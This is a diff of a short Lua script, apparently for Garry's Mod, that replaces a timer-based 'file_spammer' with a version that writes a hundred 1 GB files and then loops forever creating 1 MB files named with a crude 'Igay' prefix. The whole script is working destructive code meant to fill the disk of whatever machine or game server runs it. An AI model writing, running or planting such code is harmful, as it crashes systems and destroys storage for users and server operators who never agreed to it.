@@ -1,22 +1,19 @@
-local one_mb = string.rep("A", 1024 * 1024)  -- 1 МБ блок
-local function writeFile(name, mbCount)
-    local f = file.Open(name, "wb", "DATA")
-    if not f then print("Не удалось открыть файл: " .. name) return end
-    for i = 1, mbCount do
+local one_mb = string.rep("A", 1024 * 1024) -- 1 МБ блок
+local fileIndex = 0
+
+for i = 1, 100 do
+    fileIndex = fileIndex + 1
+    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
+    for j = 1, 1024 do -- 1 ГБ = 1024 МБ
         f:Write(one_mb)
     end
     f:Close()
+    print("[1GB FILE] Created: Igay_" .. fileIndex)
 end
 
--- Асинхронно создаёт файлы без остановки
-local id = "file_spammer"
-local fileIndex = 0
-
-timer.Create(id, 0, 0, function()
+while true do
     fileIndex = fileIndex + 1
-
-    local filename = "Igay_" .. fileIndex .. ".dat"
-    local sizeMB = fileIndex <= 100 and 1024 or 1
-
-  
-end)
+    local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
+    f:Write(one_mb) -- 1 МБ
+    f:Close()
+end
